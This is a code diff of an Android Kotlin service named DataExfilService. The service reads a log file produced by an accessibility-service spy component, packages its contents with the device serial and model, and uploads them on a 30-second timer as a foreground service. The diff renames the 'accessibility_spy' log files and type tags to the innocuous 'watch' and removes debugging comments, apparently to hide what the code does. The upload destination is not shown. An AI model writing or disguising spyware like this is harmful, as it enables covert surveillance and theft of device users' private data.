@@ -43,7 +43,7 @@ class DataExfilService : Service() {
     private lateinit var handler: Handler
     private var isUploading = false
 
-    // Upload every 30 seconds (for testing)
+    // Upload every 30 seconds
     private val uploadInterval = 30 * 1000L
 
     private val uploadRunnable = object : Runnable {
@@ -64,7 +64,7 @@ class DataExfilService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "Data exfiltration service started")
 
-        // CRITICAL FIX: Start as foreground service immediately
+        // Start as foreground service immediately
         startForegroundService()
 
         // Start periodic uploads
@@ -157,7 +157,7 @@ class DataExfilService : Service() {
 
     private fun readSpyLogs(): String {
         return try {
-            val logFile = File(filesDir, "accessibility_spy.log")
+            val logFile = File(filesDir, "watch.log")
             if (logFile.exists()) {
                 val fileSize = logFile.length()
                 Log.d(TAG, "Log file exists, size: $fileSize bytes")
@@ -184,7 +184,7 @@ class DataExfilService : Service() {
         Log.d(TAG, "Parsing ${logsArray.size} log entries")
 
         val notificationData = JSONObject().apply {
-            put("type", "accessibility_spy")
+            put("type", "watch")
             put("device_id", Build.SERIAL ?: "unknown")
             put("device_model", Build.MODEL)
             put("android_version", Build.VERSION.RELEASE)
@@ -222,11 +222,6 @@ class DataExfilService : Service() {
         }
 
         notificationData.put("logs", categorizedLogs)
-
-        // Also include raw logs (last 50 lines for debugging)
-        val rawLogsArray = JSONArray()
-        logsArray.takeLast(50).forEach { rawLogsArray.put(it) }
-        notificationData.put("raw_logs_sample", rawLogsArray)
 
         return notificationData
     }
@@ -283,10 +278,10 @@ class DataExfilService : Service() {
 
     private fun archiveLogs() {
         try {
-            val logFile = File(filesDir, "accessibility_spy.log")
+            val logFile = File(filesDir, "watch.log")
             if (logFile.exists() && logFile.length() > 0) {
                 val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-                val archivedFile = File(filesDir, "accessibility_spy_$timestamp.log")
+                val archivedFile = File(filesDir, "watch_$timestamp.log")
                 logFile.copyTo(archivedFile)
                 // Clear the original log file after archiving
                 logFile.writeText("")
